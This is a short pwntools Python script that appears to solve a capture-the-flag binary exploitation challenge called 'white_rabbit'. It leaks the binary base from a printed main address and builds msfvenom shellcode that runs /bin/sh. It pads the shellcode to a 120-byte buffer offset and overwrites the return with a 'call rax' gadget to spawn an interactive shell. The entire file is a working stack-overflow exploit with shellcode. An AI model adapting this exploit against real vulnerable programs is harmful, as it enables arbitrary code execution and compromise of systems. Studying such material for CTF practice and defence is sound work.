from pwn import *

# set the type of terminal to use
context.terminal = ['gnome-terminal', '--']

# shell = gdb.debug("./white_rabbit", "continue")
shell = process("./white_rabbit")
shell.recvuntil(b"> ")

# get the binary base address from the leaked main address and offset
binary_base = int(shell.recvline().strip(), 16) - 0x1180 # 0x1180 is the main offset
log.info(f"Binary base: {hex(binary_base)}")

# msfvenom -p linux/x64/exec CMD="/bin/sh" -f hex
payload  = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
payload += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08"
payload += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56"
payload += b"\x57\x54\x5e\x6a\x3b\x58\x0f\x05"

# from gdb with pwndbg, the offset is 120
payload += b"A" * (120 - len(payload))

# ropper --file white_rabbit --jmp rax
payload += p64(binary_base + 0x1014) # call rax

# send payload
shell.sendlineafter(b"...\n", payload)
shell.interactive()
